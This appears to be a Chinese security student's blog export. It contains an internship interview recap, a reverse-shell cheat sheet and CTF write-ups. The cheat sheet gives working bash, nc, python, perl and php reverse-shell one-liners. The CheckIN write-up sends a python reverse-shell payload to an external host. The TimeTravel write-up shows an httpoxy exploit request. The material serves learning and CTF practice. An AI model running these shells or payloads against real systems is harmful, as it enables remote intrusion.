<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>腾讯实习生面经</title>
    <url>/2020/03/13/%E8%85%BE%E8%AE%AF%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<h2 id="0x00-收到面试通知"><a href="#0x00-收到面试通知" class="headerlink" title="0x00 收到面试通知"></a>0x00 收到面试通知</h2><p>人生中总有许许多多的第一次，本菜鸡终于迎来了第一次面试。昨天晚上填写的申请，今天就收到了面试通知。效率还是很高的。心情很是复杂，不过不知为什么又有一种什么都不慌的感觉（可能是破罐破摔吧）</p>
<a id="more"></a>

<p><img src="../pic/131.png" alt=""></p>
<h2 id="0x01-电话接通"><a href="#0x01-电话接通" class="headerlink" title="0x01 电话接通"></a>0x01 电话接通</h2><p>感觉面试官挺好的，语气很好，是腾讯云安全部。</p>
<p><strong>自我介绍</strong></p>
<p>感觉自己有点语无伦次，语言表达能力有待提高</p>
<p>自己来自于哪个大学balabala，大一弄了几一年ACM，然后最近在打CTF，没有了（<strong>就几十个字</strong>）</p>
<p>感觉自己好傻。。。。（自己年级也忘记说了，面试官后面问的）</p>
<p><strong>说说打ctf最有印象的题目</strong></p>
<p>巴拉巴拉说了一个sql注入的题目</p>
<p><strong>如何判断数据库类型（MYSQL、mssql）</strong></p>
<p>查看版本，使用特有的函数</p>
<p><strong>手工猜表名</strong></p>
<p>我一直以为是有回显，一直搞错了方向。这里绕了好久。</p>
<p><strong>讲讲影响比较深的xss题目</strong></p>
<p>balabala</p>
<p><strong>项目经历</strong></p>
<p>面试官一直在引导，没有项目经历可以说一说大作业。然后又扯到了sql注入</p>
<p><strong>如何防止sql注入</strong></p>
<p>过滤关键字，添加一个沙盒观察经行行为监控，但是后果是用户体验不好（这个点也是）</p>
<p><strong>如何入侵linux</strong></p>
<p>端口扫描，有服务漏洞直接入侵，重点查看80端口和443，写webshell</p>
<p><strong>有webshell如何提权</strong></p>
<p>查看运行了什么服务，搜索这些服务的漏洞。</p>
<p><strong>如何知道被入侵</strong></p>
<p>查看bash_histery，端口连接情况。</p>
<p><strong>如何知道bash_histery被修改</strong></p>
<p>没有答出来，面试官给了答案</p>
<p><strong>有什么想要问的</strong></p>
<p>不知道问什么，后面面试官给我介绍了腾讯云云镜</p>
<h2 id="0x02-收到二面通知"><a href="#0x02-收到二面通知" class="headerlink" title="0x02 收到二面通知"></a>0x02 收到二面通知</h2><p>几个小时后收到短信，准备二面。</p>
<p>觉得自己打得很菜，特别是sql注入猜表名，答非所问了。努力吧</p>
<p>我害傻乎乎的看错了时间，以为是当天面试，结果是三天后（还打了电话给腾讯客服）</p>
<p><img src="../pic/132.png" alt=""></p>
]]></content>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike的安装</title>
    <url>/2020/03/12/Cobalt-Strike%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于反弹shell的姿势</title>
    <url>/2020/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="linux下的反弹"><a href="#linux下的反弹" class="headerlink" title="linux下的反弹"></a>linux下的反弹</h2><p>本机使用nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>linux shell下常用的文件描述符是：</p>
<blockquote>
<ol>
<li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
</li>
<li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
</li>
<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
</li>
</ol>
</blockquote>
</li>
<li><p>bash -i 新开一个交互bash</p>
</li>
<li><p>&gt;&amp;或者 &amp;&gt;  将标准错误输出定向到标准输出中</p>
</li>
<li><p>0&gt;&amp;1或者0&lt;&amp;1将标准输入重定向到标准输出中</p>
</li>
<li><p>/dev/tcp/host/port  使用tcp通道与host:post建立一个连接</p>
</li>
<li><p>如果还是不清楚 参考手册<a href="https://www.gnu.org/software/bash/manual/bash.pdf" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/bash.pdf</a> 3.6 章redirections</p>
</li>
</ul>
</blockquote>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash host port</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nc -e   inbound program to exec [dangerous!!]</p>
</blockquote>
<p>有些版本的NC没有-e选项，在本机开两个端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port1</span><br><span class="line">nc -lvp port2</span><br></pre></td></tr></table></figure>



<p>受控机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc host port1 | &#x2F;bin&#x2F;bash | nc host port2</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出</p>
</li>
<li><p>将nc 改成telnet 也是可以的</p>
</li>
</ul>
</blockquote>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>



<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;host&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>



<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;host&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p>
</blockquote>
<p>参考连接</p>
<p><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/147768.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a></p>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>win子系统安装kali工具记录</title>
    <url>/2020/03/05/win%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>win下的子系统kali默认是不带有Metasploit</p>
<p>如果是其他linux安装需要换源</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>

<p>会自动选取最近的源服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>换好之后就是更新一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<p>下载需要的工具例如Matesploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>

<p>安装好之后需要初始化postgres数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo msfdb init</span><br></pre></td></tr></table></figure>

<p>安装ncat，sqlmap，nmap,aircrack-ng等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y insatll ncat</span><br><span class="line">sudo apt-get -y insatll sqlmap</span><br><span class="line">sudo apt-get -y insatll nmap</span><br><span class="line">sudo apt-get -y insatll aircrack-ng</span><br></pre></td></tr></table></figure>



<p>在安装完wireshark后运行报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sx@QAQ:~$ wireshark</span><br><span class="line">wireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<p>删除标签即可参考链接<a href="https://github.com/Microsoft/WSL/issues/3023" target="_blank" rel="noopener">https://github.com/Microsoft/WSL/issues/3023</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo strip --remove-section&#x3D;.note.ABI-tag &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5Core.so.5.12.5</span><br></pre></td></tr></table></figure>



<p>记录一下更改用户名以及家目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usermod -l NewUser -d &#x2F;home&#x2F;NewUser -m OldUser</span><br></pre></td></tr></table></figure>



<p>直接ping host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping: socket: Operation not permitted</span><br></pre></td></tr></table></figure>

<p>sudo ping 后正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo ping 1.1.1.1</span><br><span class="line">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;191 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;187 ms</span><br></pre></td></tr></table></figure>

<p>解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ type ping</span><br><span class="line">ping is hashed (&#x2F;usr&#x2F;bin&#x2F;ping)</span><br><span class="line">$ sudo chmod +s &#x2F;usr&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>工具安装</tag>
      </tags>
  </entry>
  <entry>
    <title>v&amp;n内部赛</title>
    <url>/2020/02/29/v-n%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码</p>
<p><a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/amp/</a></p>
<p>发现有一个题目名字叫做flagflag你在哪</p>
<a id="more"></a>

<p>在file处有一个miaoflag文件打开就是flag</p>
<p><img src="../pic/125.png" alt=""></p>
<h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>打开题目就是源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)</span><br><span class="line"># flag &#x3D; flag_file.read()</span><br><span class="line"># flag_file.close()</span><br><span class="line">#</span><br><span class="line"># @app.route(&#39;&#x2F;flag&#39;)</span><br><span class="line"># def flag():</span><br><span class="line">#     return flag</span><br><span class="line">## want flag? naive!</span><br><span class="line"></span><br><span class="line"># You will never find the thing you want:) I think</span><br><span class="line">@app.route(&#39;&#x2F;shell&#39;)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(&quot;rm -f flag.txt&quot;)</span><br><span class="line">    exec_cmd &#x3D; request.args.get(&#39;c&#39;)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    return &quot;1&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def source():</span><br><span class="line">    return open(&quot;app.py&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure>

<p>发现flag_file已经打开了flag.txt</p>
<p>可以执行系统命令，发现用bash弹shell用不了</p>
<p>使用DNS/OOB记录所有文件</p>
<p>DNS/OOB<a href="https://www.freebuf.com/articles/database/183997.html" target="_blank" rel="noopener">参考文章</a></p>
<p>手残了一下把（ls -R/）所有进行了dns解析</p>
<p>使用VPSnc监听12345端口</p>
<p>nc -lvvp 12345</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ns.seye.gq&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>进去之后发现没有grep功能，</p>
<p>ls -alR /</p>
<p>列出所有文件搜索flag</p>
<p><img src="../pic/126.png" alt=""></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>提供了源码，下载下来进行代码审计</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>打开就是源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require __DIR__ . &#39;&#x2F;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">    $client &#x3D; new Client();</span><br><span class="line">    $response &#x3D; $client-&gt;get(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;api&#x2F;eligible&#39;);</span><br><span class="line">    $content &#x3D; $response-&gt;getBody();</span><br><span class="line">    $data &#x3D; json_decode($content, TRUE);</span><br><span class="line">    if($data[&#39;success&#39;] &#x3D;&#x3D;&#x3D; true) &#123;   &#x2F;&#x2F;true返回值是数组,否则返回值为object</span><br><span class="line">      echo system(&#39;&#x2F;readflag&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    highlight_file($_GET[&#39;file&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看phpinfo</p>
<p>是5.6.23版本的</p>
<p>发现没有禁用函数</p>
<table>
<thead>
<tr>
<th>allow_url_fopen</th>
<th>On</th>
</tr>
</thead>
<tbody><tr>
<td>allow_url_include</td>
<td>Off</td>
</tr>
</tbody></table>
<p>存在任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;autoload.php</span><br><span class="line">require_once __DIR__ . &#39;&#x2F;composer&#x2F;autoload_real.php&#39;;</span><br><span class="line"></span><br><span class="line">return ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;autoload_real.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;.&#x2F;vendor&#x2F;composer&#x2F;ClassLoader.php</span><br></pre></td></tr></table></figure>

<p><del>看到guzzlehttp/guzzle有任意写文件漏洞<a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86452</a></del></p>
<p>查看composer.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;composer.json</span><br><span class="line">&#123;</span><br><span class="line">   &quot;require&quot;: &#123;</span><br><span class="line">      &quot;guzzlehttp&#x2F;guzzle&quot;: &quot;6.2.0&quot;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>出题人<a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">赵师傅博客</a>也说了是改自<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p>
<p>考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明</p>
<blockquote>
<p>CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。</p>
<p>nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。</p>
</blockquote>
<p>访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$response &#x3D; $client-&gt;get(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;api&#x2F;eligible&#39;);</span><br></pre></td></tr></table></figure>

<p>在代理服务器中弄一个web服务器，api/eligible的内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;success&quot;:True&#125;</span><br></pre></td></tr></table></figure>

<p>即可得到。</p>
<p><strong>注意</strong></p>
<p>由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，</p>
<p>创建一个文件内容为例如 a.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>在linux上使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234 &lt; a.txt</span><br></pre></td></tr></table></figure>

<p>然后发访问<a href="http://xxx/?flag，抓包添加一个proxy头部" target="_blank" rel="noopener">http://xxx/?flag，抓包添加一个proxy头部</a> 地址为你获取控制权的linux ip地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;?flag HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:25315</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0, no-cache</span><br><span class="line">Proxy: http:&#x2F;&#x2F;174.0.246.216:1234&#x2F;</span><br><span class="line">Pragma: no-cache</span><br></pre></td></tr></table></figure>

<p>即可获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"> ········</span><br><span class="line"> </span><br><span class="line">#DD0000&quot;&gt;&#39;phpinfo&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;]))&amp;nbsp;&#123;&lt;br &#x2F;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;phpinfo&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;();&lt;br &#x2F;&gt;&#125;&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;code&gt;flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br><span class="line">flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>安恒月赛20200226</title>
    <url>/2020/02/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200226/</url>
    <content><![CDATA[<h1 id="easy-hash"><a href="#easy-hash" class="headerlink" title="easy-hash"></a>easy-hash</h1><p>打开题目就是源码</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$val1 &#x3D; @$_GET[&#39;val1&#39;];</span><br><span class="line">$val2 &#x3D; @$_GET[&#39;val2&#39;];</span><br><span class="line">$val3 &#x3D; @$_GET[&#39;val3&#39;];</span><br><span class="line">$val4 &#x3D; @$_GET[&#39;val4&#39;];</span><br><span class="line">$val5 &#x3D; (string)@$_POST[&#39;val5&#39;];</span><br><span class="line">$val6 &#x3D; (string)@$_POST[&#39;val6&#39;];</span><br><span class="line">$val7 &#x3D; (string)@$_POST[&#39;val7&#39;];</span><br><span class="line">if( $val1 &#x3D;&#x3D; $val2 )&#123;</span><br><span class="line">    die(&#39;val1 OR val2 no no no&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($val1) !&#x3D; md5($val2) )&#123;</span><br><span class="line">    die(&#39;step 1 fail&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if( $val3 &#x3D;&#x3D; $val4 )&#123;</span><br><span class="line">    die(&#39;val3 OR val4 no no no&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($val3) !&#x3D;&#x3D; md5($val4))&#123;</span><br><span class="line">    die(&#39;step 2 fail&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if( $val5 &#x3D;&#x3D; $val6 || $val5 &#x3D;&#x3D; $val7 || $val6 &#x3D;&#x3D; $val7 )&#123;</span><br><span class="line">    die(&#39;val5 OR val6 OR val7 no no no&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($val5) !&#x3D;&#x3D; md5($val6) || md5($val6) !&#x3D;&#x3D; md5($val7) || md5($val5) !&#x3D;&#x3D; md5($val7))&#123;</span><br><span class="line">    die(&#39;step 3 fail&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $_POST[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_POST[&#39;b&#39;];</span><br><span class="line">$m &#x3D; $_GET[&#39;m&#39;];</span><br><span class="line">$n &#x3D; $_GET[&#39;n&#39;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_alnum($a)) || (strlen($a) &gt; 5)  || !(ctype_alnum($b)) || (strlen($b) &gt; 6))    &#x2F;&#x2F;&#x2F;&#x2F;判断是否是字母和数字或字母数字的组合</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 &#x3D; md5($a);</span><br><span class="line">$val9 &#x3D; strtr(md5($b), $m, $n);  &#x2F;&#x2F;将MD5后包含$m的内容替换为$n</span><br><span class="line"></span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo &quot;&lt;p&gt;val8 : $val8&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo &quot;&lt;p&gt;val9 : $val9&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">if (($val8 &#x3D;&#x3D; $val9) &amp;&amp; !($a &#x3D;&#x3D;&#x3D; $b) &amp;&amp; (strlen($b) &#x3D;&#x3D;&#x3D; 5))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;nice,good job,give you flag:&quot;;</span><br><span class="line">    echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;);</span><br><span class="line">&#125; val1 OR val2 no no no</span><br></pre></td></tr></table></figure>

<p>显然的MD5碰撞</p>
<p>生成的四组不同字符相同MD5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class="line"></span><br><span 